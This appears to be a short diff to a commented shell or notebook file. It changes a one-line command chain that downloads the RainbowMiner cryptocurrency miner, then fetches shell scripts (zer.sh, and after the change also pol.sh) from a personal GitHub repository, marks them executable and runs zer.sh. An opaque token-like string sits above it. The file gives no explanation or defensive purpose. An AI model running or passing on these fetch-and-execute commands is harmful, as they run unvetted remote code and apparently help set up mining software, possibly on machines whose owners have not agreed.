@@ -14,4 +14,4 @@
 
 # 2KtRkhcqvGb9pHLTIlm35oPjzf2_4bLwDzDfPeEEuMaVGBtmW
 
-# wget https://github.com/RainbowMiner/RainbowMiner/releases/download/v4.9.0.1/RainbowMinerV4.9.0.1_linux.zip && unzip RainbowMinerV4.9.0.1_linux.zip && wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/zer.sh && chmod +x zer.sh && ./zer.sh
+# wget https://github.com/RainbowMiner/RainbowMiner/releases/download/v4.9.0.1/RainbowMinerV4.9.0.1_linux.zip && unzip RainbowMinerV4.9.0.1_linux.zip && wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/pol.sh && chmod +x pol.sh && wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/zer.sh && chmod +x zer.sh && ./zer.sh
